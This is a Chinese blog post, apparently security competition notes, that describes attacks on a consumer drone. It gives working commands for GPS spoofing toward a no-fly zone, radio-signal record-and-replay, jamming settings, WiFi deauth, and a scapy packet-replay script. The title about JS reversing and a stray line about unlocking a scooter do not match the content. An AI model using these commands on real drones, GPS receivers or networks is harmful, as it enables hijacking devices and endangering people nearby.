@@ -1,0 +1,366 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>js逆向初探 | EPs1l0h's Castle</title><meta name="author" content="EPs1l0h"><meta name="copyright" content="EPs1l0h"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="无人机攻击想法与尝试拟态的比赛有一个之前从来没有在任何比赛出现过的项目：现场给你一台无人机，主办方给你提供 hackrf + 可以抓包的无线网卡，让你去打无人机（商用无人机实网挑战） 以前从来没接触过相关的知识，研究的有点慢。借了实验室一套 Hackrf 开发板和一根外接天线，买了一个 JYMind 03 的无人机进行了一些攻击尝试，希望能给以后相关的比赛做一点技术储备 GPS 面的攻击一般就是">
+<meta property="og:type" content="article">
+<meta property="og:title" content="js逆向初探">
+<meta property="og:url" content="https://example.com/2024/10/26/%E6%97%A0%E4%BA%BA%E6%9C%BA%E6%94%BB%E5%87%BB%E6%83%B3%E6%B3%95%E4%B8%8E%E5%B0%9D%E8%AF%95/index.html">
+<meta property="og:site_name" content="EPs1l0h&#39;s Castle">
+<meta property="og:description" content="无人机攻击想法与尝试拟态的比赛有一个之前从来没有在任何比赛出现过的项目：现场给你一台无人机，主办方给你提供 hackrf + 可以抓包的无线网卡，让你去打无人机（商用无人机实网挑战） 以前从来没接触过相关的知识，研究的有点慢。借了实验室一套 Hackrf 开发板和一根外接天线，买了一个 JYMind 03 的无人机进行了一些攻击尝试，希望能给以后相关的比赛做一点技术储备 GPS 面的攻击一般就是">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://github.com/EPs1l0h/EPs1l0h.github.io/blob/main/medias/cover/cover1.jpg?raw=true">
+<meta property="article:published_time" content="2024-10-26T06:57:40.000Z">
+<meta property="article:modified_time" content="2024-12-10T14:01:58.068Z">
+<meta property="article:author" content="EPs1l0h">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/EPs1l0h/EPs1l0h.github.io/blob/main/medias/cover/cover1.jpg?raw=true"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://example.com/2024/10/26/%E6%97%A0%E4%BA%BA%E6%9C%BA%E6%94%BB%E5%87%BB%E6%83%B3%E6%B3%95%E4%B8%8E%E5%B0%9D%E8%AF%95/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'js逆向初探',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-12-10 22:01:58'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="source/css/aplayer_custom.css"><meta name="generator" content="Hexo 6.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">60</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> home</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/writeup"><i class="fa-fw fas fa-folder-open"></i><span> writeup</span></a></li><li><a class="site-page child" href="/categories/notes"><i class="fa-fw fas fa-folder-open"></i><span> notes</span></a></li><li><a class="site-page child" href="/categories/jottings"><i class="fa-fw fas fa-folder-open"></i><span> jottings</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-link"></i><span> Link</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" target="_blank" rel="noopener" href="https://www.cnblogs.com/Here-is-SG"><i class="fa-fw fas fa-link"></i><span> iPlayForSG</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://jameshoi.github.io/"><i class="fa-fw fas fa-link"></i><span> jameshoi</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://www.cnblogs.com/Only-xiaoxiao"><i class="fa-fw fas fa-link"></i><span> xiaoxiao</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://www.cnblogs.com/Clovershrub"><i class="fa-fw fas fa-link"></i><span> Clovershrub</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://blog.gaoyucan.site/"><i class="fa-fw fas fa-link"></i><span> gaoyucan</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://demoyao100.github.io/"><i class="fa-fw fas fa-link"></i><span> moyao</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://lantern.cool/"><i class="fa-fw fas fa-link"></i><span> lantern</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://mapleqian.github.io/"><i class="fa-fw fas fa-link"></i><span> Serendy</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://github.com/EPs1l0h/EPs1l0h.github.io/blob/main/medias/cover/cover1.jpg?raw=true')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">EPs1l0h's Castle</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> home</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/writeup"><i class="fa-fw fas fa-folder-open"></i><span> writeup</span></a></li><li><a class="site-page child" href="/categories/notes"><i class="fa-fw fas fa-folder-open"></i><span> notes</span></a></li><li><a class="site-page child" href="/categories/jottings"><i class="fa-fw fas fa-folder-open"></i><span> jottings</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-link"></i><span> Link</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" target="_blank" rel="noopener" href="https://www.cnblogs.com/Here-is-SG"><i class="fa-fw fas fa-link"></i><span> iPlayForSG</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://jameshoi.github.io/"><i class="fa-fw fas fa-link"></i><span> jameshoi</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://www.cnblogs.com/Only-xiaoxiao"><i class="fa-fw fas fa-link"></i><span> xiaoxiao</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://www.cnblogs.com/Clovershrub"><i class="fa-fw fas fa-link"></i><span> Clovershrub</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://blog.gaoyucan.site/"><i class="fa-fw fas fa-link"></i><span> gaoyucan</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://demoyao100.github.io/"><i class="fa-fw fas fa-link"></i><span> moyao</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://lantern.cool/"><i class="fa-fw fas fa-link"></i><span> lantern</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://mapleqian.github.io/"><i class="fa-fw fas fa-link"></i><span> Serendy</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">js逆向初探</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-10-26T06:57:40.000Z" title="发表于 2024-10-26 14:57:40">2024-10-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-12-10T14:01:58.068Z" title="更新于 2024-12-10 22:01:58">2024-12-10</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/notes/">notes</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="js逆向初探"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="无人机攻击想法与尝试"><a href="#无人机攻击想法与尝试" class="headerlink" title="无人机攻击想法与尝试"></a>无人机攻击想法与尝试</h1><p>拟态的比赛有一个之前从来没有在任何比赛出现过的项目：现场给你一台无人机，主办方给你提供 hackrf + 可以抓包的无线网卡，让你去打无人机（商用无人机实网挑战）</p>
+<p>以前从来没接触过相关的知识，研究的有点慢。借了实验室一套 Hackrf 开发板和一根外接天线，买了一个 JYMind 03 的无人机进行了一些攻击尝试，希望能给以后相关的比赛做一点技术储备</p>
+<h1 id="GPS-面的攻击"><a href="#GPS-面的攻击" class="headerlink" title="GPS 面的攻击"></a>GPS 面的攻击</h1><p>一般就是 GPS 欺骗。做到这一点的话，有几种攻击思路：</p>
+<ol>
+<li>欺骗无人机的起点，待无人机起飞后 GPS 定向返航就会往虚假地点返航；</li>
+<li>在飞行过程中给一个假的 GPS 信号，让无人机以为自己超过最大航距然后返航；</li>
+<li>给一个在禁飞区的 GPS 定位，比较高级的无人机就会识别到禁飞区然后迫降。</li>
+</ol>
+<h3 id="一次-GPS-欺骗实验"><a href="#一次-GPS-欺骗实验" class="headerlink" title="一次 GPS 欺骗实验"></a>一次 GPS 欺骗实验</h3><p>对于 Hackrf One，需要一个生成卫星信号的<code>gps-sdr-sim</code>和用于发射信号的<code>hackrf_transfer</code>，首先得知道模拟的地方的经纬度，可以在 Google Map上拿坐标，右键一下就行。Google 的卫星地图使用的是 WGS84 坐标，和 gps-sdr-sim 用的是一个格式，不用额外转换。</p>
+<p>这里我们选择天安门作为我们要发送的坐标（妥妥的禁飞区）</p>
+<p><img src="/2024/10/26/%E6%97%A0%E4%BA%BA%E6%9C%BA%E6%94%BB%E5%87%BB%E6%83%B3%E6%B3%95%E4%B8%8E%E5%B0%9D%E8%AF%95/QQ_1731513451421.png" alt="QQ_1731513451421.png"></p>
+<p>然后需要在 NASA 的网站 <a target="_blank" rel="noopener" href="https://cddis.nasa.gov/archive/gnss/data/daily/2023/">https://cddis.nasa.gov/archive/gnss/data/daily/2024/</a> 去找比较新 GPS 星历。它包含了GPS卫星的位置、速度、时钟等信息，用来生成假的 GPS 信号。</p>
+<p><img src="/2024/10/26/%E6%97%A0%E4%BA%BA%E6%9C%BA%E6%94%BB%E5%87%BB%E6%83%B3%E6%B3%95%E4%B8%8E%E5%B0%9D%E8%AF%95/image.png" alt="image.png"></p>
+<p>这里我们选择 <a target="_blank" rel="noopener" href="https://cddis.nasa.gov/archive/gnss/data/daily/2024/318/24n/brdc3180.24n.gz">https://cddis.nasa.gov/archive/gnss/data/daily/2024/318/24n/brdc3180.24n.gz</a>，也就是 2024年11月13日的最新星历，然后使用<code>gps-sdr-sim</code>：<code>./gps-sdr-sim -e brdc3180.24n -l 39.908741,116.397480,100 -b 8</code> ，</p>
+<p>-l后面是经纬度和海拔（注意不能有空格），-b是数据位数，hackrf 支持的是 8 位，-e 是指定星历，默认生成 300 秒的信号，结果会默认存在gpssim.bin文件中</p>
+<p><img src="/2024/10/26/%E6%97%A0%E4%BA%BA%E6%9C%BA%E6%94%BB%E5%87%BB%E6%83%B3%E6%B3%95%E4%B8%8E%E5%B0%9D%E8%AF%95/QQ_1731513964332.png" alt="QQ_1731513964332.png"></p>
+<p>随后用 hackrf 调制发送：<code>hackrf_transfer -t gpssim.bin -f 1575420000 -s 2600000 -a 1 -x 10</code></p>
+<p>-t 是 GPS 信号文件，-f 是民用 GPS 卫星频率 1575.42MHz，-s 是采样率，-a 是 TX RF 放大器（外接天线），-x 是 TX VGA (IF) 增益</p>
+<p><img src="/2024/10/26/%E6%97%A0%E4%BA%BA%E6%9C%BA%E6%94%BB%E5%87%BB%E6%83%B3%E6%B3%95%E4%B8%8E%E5%B0%9D%E8%AF%95/QQ_1731514181167.png" alt="QQ_1731514181167.png"></p>
+<p>手机和无人机的信号都能进行欺骗，但是不知道是不是咱们实验室翻出来的这块 hackrf 的板子有点问题，或者是实验室翻出来的外接天线的功率有问题之类的，欺骗成功率比较低，得试很多次才成功一次，此外，重启手机可以有效提高欺骗成功率。</p>
+<p>可以看出，欺骗成功后，手机已经显示其坐标位于我们发送的天安门坐标，39.90873357804588, 116.39748764719477</p>
+<p><img src="/2024/10/26/%E6%97%A0%E4%BA%BA%E6%9C%BA%E6%94%BB%E5%87%BB%E6%83%B3%E6%B3%95%E4%B8%8E%E5%B0%9D%E8%AF%95/c94794bfd10bb86db30e42ccb81b478.jpg" alt="c94794bfd10bb86db30e42ccb81b478.jpg"></p>
+<p><img src="/2024/10/26/%E6%97%A0%E4%BA%BA%E6%9C%BA%E6%94%BB%E5%87%BB%E6%83%B3%E6%B3%95%E4%B8%8E%E5%B0%9D%E8%AF%95/7d7d361c7384028fa12e00f44b044c4.jpg" alt="7d7d361c7384028fa12e00f44b044c4.jpg"></p>
+<p><img src="/2024/10/26/%E6%97%A0%E4%BA%BA%E6%9C%BA%E6%94%BB%E5%87%BB%E6%83%B3%E6%B3%95%E4%B8%8E%E5%B0%9D%E8%AF%95/6b1b5be56549ed79fd961f563e57a4b.jpg" alt="6b1b5be56549ed79fd961f563e57a4b.jpg"></p>
+<p>另一个问题是北邮附近禁飞，想  试对无人机最终的攻击效果得去比较远的地方尝试</p>
+<h1 id="射频面的攻击"><a href="#射频面的攻击" class="headerlink" title="射频面的攻击"></a>射频面的攻击</h1><p>无人机会配套一个遥控器去进行控制。不同厂家生产的遥控器所在频段也不是很一样，这个可以参考说明书/官方网站/店铺的公开参数去查大概的频段。大部分的无人机遥控器频段都在 2.4GHz。</p>
+<h3 id="确定信号频段"><a href="#确定信号频段" class="headerlink" title="确定信号频段"></a>确定信号频段</h3><p>使用 gqrx + hackrf 做到音频+可视化界面一起监听无线电信号，设置好后在 2.4GHz +- 100MHz 的频段去尝试监听。</p>
+<p>把遥控器放在 hackrf 的外接天线旁边，做一些开关动作，找到有明显契合该动作的无线电变化的频段，就是遥控器的频段。经过一晚上人肉遍历以后，发现2.478Ghz这个频段特征非常明显，随着遥控器开关，该频段会随之显示信号/消失。</p>
+<p><img src="/2024/10/26/%E6%97%A0%E4%BA%BA%E6%9C%BA%E6%94%BB%E5%87%BB%E6%83%B3%E6%B3%95%E4%B8%8E%E5%B0%9D%E8%AF%95/QQ_1731515327599.png" alt="QQ_1731515327599.png"></p>
+<h3 id="重放攻击"><a href="#重放攻击" class="headerlink" title="重放攻击"></a>重放攻击</h3><p>这里衍生出几种可能的攻击。一种是重放攻击，如果对重放攻击防护的不是很完善，可以首先录制 RC 和无人机建立连接的握手通信，然后再录制起飞、迫降等操作的遥控通信，随后分别进行重放，劫持无人机控制权并且进行各种遥控操作。可惜我自己去尝试的时候没有成功，可能是有对重放攻击的校验，也可能是天线发送功率有问题。</p>
+<p>这里涉及到三个概念：固定码，学习码和滚动码</p>
+<p>固定码：固定码的地址码是固定不变的，通常由一组预设的8位或更长的地址码组成。每个遥控器和接收器都有一个唯一的地址码，用于标识发送和接收的设备。</p>
+<p>学习码：学习码是一种通过“学习”配对的编码系统。在这种系统中，遥控器和接收器之间的通信信号并不是通过固定的预设码传输，而是通过一个“学习”过程使接收器记住特定遥控器发出的码。遥控器和接收器在首次配对时，通过一定的学习过程建立起匹配关系，只有通过这个学习过程配对的遥控器才会与接收器进行通信。</p>
+<p>学习的过程为：</p>
+<ol>
+<li>接收器通过一些物理按钮进入学习模式，指示灯闪烁</li>
+<li>遥控器发送信号（可能包含一个动态生成的编码）</li>
+<li>接收器接收并存储信号，同时确认存储，指示灯常亮</li>
+<li>完成配对并退出学习模式</li>
+</ol>
+<p>滚动码：滚动码系统在每次发送时都会生成一个新的、唯一的码。每个码都是基于当前的计数值（同步计数）和一个固定的密钥（通常是加密算法）生成的。同步计数会随着每次发送而递增，因此即使是同一个按键被多次按下，每次发送的码也都不同。</p>
+<p>录制信号：</p>
+<p>使用指令进行信号录制并存入文件，<code>-r</code> 为写入文件，<code>dian.raw</code> 即为录制的文件名；<code>-f</code> 为采样频率； <code>-g</code> 为 RX VGA(baseband) gain；<code>-l</code> 为 RX LAN(IF) gain。<code>-g -l</code> 用来进行信号放大。运行后对准天线按下遥控器，可以多按几下，然后ctrl+c停止录制。</p>
+<p><code>hackrf_transfer -r dian.raw -f 2478000000 -g 16 -l 32</code></p>
+<p>重放信号</p>
+<p>录制完毕并存入文件后，使用下述指令进行重放，重放的文件就是刚刚录制的。<code>-t</code> 用来制定文件；<code>-x</code> 为 TX VGA (IF) gain 放大信号。重放时天线对准电车，即可实现车辆解锁。</p>
+<p><code>hackrf_transfer -t dian.raw -f 2478000000 -x 47</code></p>
+<h3 id="噪声覆盖"><a href="#噪声覆盖" class="headerlink" title="噪声覆盖"></a>噪声覆盖</h3><p>另一种是直接干扰遥控器的控制信号。因为之前已经监听到遥控器的频段，所以直接在这个频段用 hackrf 去不停地发送噪音去填满这个频段，就可以阻碍无人机和遥控器的通信了。</p>
+<p>用 hackrf 的 Jammer 模块，中心频段设为 2478MHz，宽度设个 2MHz，跳频 10kHz，每一跳隔 50ms，然后开始发送噪音。我一直觉得借的这根天线可能有点问题的地方就在于，这里对于 hackrf 的操作应该没啥问题，并且找了很多用这种方法攻击的资料，它们甚至可以阻碍  2.4GHz 的 WiFi 通信，但是我这里并没有成功阻碍遥控器和无人机的通信。具体失败的原因还没分析出来。</p>
+<h1 id="WiFi-面的攻击"><a href="#WiFi-面的攻击" class="headerlink" title="WiFi 面的攻击"></a>WiFi 面的攻击</h1><p>很多无人机都支持 WiFi 连接手机的飞控软件进行控制，所以 WiFi 也是一个攻击面。</p>
+<p>这个需要用到一个无线网卡，由于之前买的 rtl8812au 的网卡没有找到既能用又支持监控模式的 linux 驱动，所以重新买了个 rtl8812bu 的，还没到货，所以这里都是一些概念性的攻击手段，没有具体去验证。</p>
+<p>如果没有绑 MAC 地址的话，用常规的 WiFi 渗透思路通过发包让对方的飞控掉线，然后重新用我自己的客户端连接并接管无人机理论上是可行的。这里可以用到 aircrack-ng 套件，打开网卡的监听模式，用 airodump-ng 扫描到无人机的 WiFi 信号以及其 MAC 地址，然后用 aireplay-ng 循环发包进行攻击，将正在连接该 WiFi 的设备挤下线，然后我们自己登录进该 WiFi 完成接管。</p>
+<p>另一种方法就是打开监控模式后通过网卡抓包，分析无人机的通信协议，然后去构造起飞/迫降等操作的合法流量包发送给无人机，迫使其做出一些行动。</p>
+<h2 id="Deauth-攻击"><a href="#Deauth-攻击" class="headerlink" title="Deauth 攻击"></a>Deauth 攻击</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">iwconfig <span class="comment"># 查看网卡配置信息</span></span><br><span class="line">sudo airmon-ng start wlan0 <span class="comment"># 切换位 monitor 模式</span></span><br><span class="line">sudo airodump-ng wlan0mon --band abg <span class="comment"># 开始扫描,--band abg 表示扫描2.4G和5G频率的信号</span></span><br><span class="line"><span class="comment"># 找到无人机 wifi 对应的</span></span><br><span class="line"><span class="comment"># BSSID：WiFi MAC地址</span></span><br><span class="line"><span class="comment"># PWR：信号强度</span></span><br><span class="line"><span class="comment"># BEACONS：信标</span></span><br><span class="line"><span class="comment"># DATA：数据</span></span><br><span class="line"><span class="comment"># CH：信道</span></span><br><span class="line"><span class="comment"># ENS：加密方式，图中OPN为开放</span></span><br><span class="line"><span class="comment"># ESSID：WiFi名称</span></span><br><span class="line">sudo airodump-ng wlan0mon --bssid &lt;BSSID&gt; --channel &lt;CHANNEL&gt; <span class="comment"># 把无人机wifi对应的信息拿出来，看STATION和BSSID</span></span><br><span class="line">sudo aireplay-ng --deauth 0 -c &lt;STATION&gt; -a &lt;BSSID&gt; wlan0mon <span class="comment"># --deauth为冲突攻击模式，0为循环攻击</span></span><br></pre></td></tr></table></figure>
+<h2 id="重放攻击-1"><a href="#重放攻击-1" class="headerlink" title="重放攻击"></a>重放攻击</h2><p>虚拟机配网，装操控app，连接无人机wifi，然后起飞抓包，再降落，然后保存报文</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> rdpcap, sendp</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_packets_from_pcap</span>(<span class="params">file_path, iface</span>):</span><br><span class="line">    <span class="comment"># 读取 pcapng 文件</span></span><br><span class="line">    packets = rdpcap(file_path)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> packet <span class="keyword">in</span> packets:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 发送数据包</span></span><br><span class="line">            sendp(packet, iface=iface, verbose=<span class="literal">False</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Sent packet: <span class="subst">&#123;packet.summary()&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Error sending packet: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">pcap_file = <span class="string">&quot;path_to_your_file.pcapng&quot;</span>  <span class="comment"># 替换为你的 pcapng 文件路径</span></span><br><span class="line">interface = <span class="string">&quot;Wi-Fi&quot;</span>  <span class="comment"># 替换为你的 Wi-Fi 接口名称，例如 wlan0、en0 等</span></span><br><span class="line"></span><br><span class="line">send_packets_from_pcap(pcap_file, interface)</span><br></pre></td></tr></table></figure>
+<h2 id="伪造攻击"><a href="#伪造攻击" class="headerlink" title="伪造攻击"></a>伪造攻击</h2><p>使用 tellopy 进行伪造攻击</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># simple example demonstrating how to control a Tello using your keyboard.</span></span><br><span class="line"><span class="comment"># For a more fully featured example see manual-control-pygame.py</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Use W, A, S, D for moving, E, Q for rotating and R, F for going up and down.</span></span><br><span class="line"><span class="comment"># When starting the script the Tello will takeoff, pressing ESC makes it land</span></span><br><span class="line"><span class="comment">#  and the script exit.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 简单的演示如何用键盘控制Tello</span></span><br><span class="line"><span class="comment"># 欲使用全手动控制请查看 manual-control-pygame.py</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># W, A, S, D 移动， E, Q 转向，R、F上升与下降.</span></span><br><span class="line"><span class="comment"># 开始运行程序时Tello会自动起飞，按ESC键降落</span></span><br><span class="line"><span class="comment"># 并且程序会退出</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> djitellopy <span class="keyword">import</span> Tello</span><br><span class="line"><span class="keyword">import</span> cv2, math, time</span><br><span class="line"></span><br><span class="line">tello = Tello()</span><br><span class="line">tello.connect()</span><br><span class="line"></span><br><span class="line">tello.streamon()</span><br><span class="line">frame_read = tello.get_frame_read()</span><br><span class="line"></span><br><span class="line">tello.takeoff()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># In reality you want to display frames in a seperate thread. Otherwise</span></span><br><span class="line">    <span class="comment">#  they will freeze while the drone moves.</span></span><br><span class="line">    <span class="comment"># 在实际开发里请在另一个线程中显示摄像头画面，否则画面会在无人机移动时静止</span></span><br><span class="line">    img = frame_read.frame</span><br><span class="line">    cv2.imshow(<span class="string">&quot;drone&quot;</span>, img)</span><br><span class="line"></span><br><span class="line">   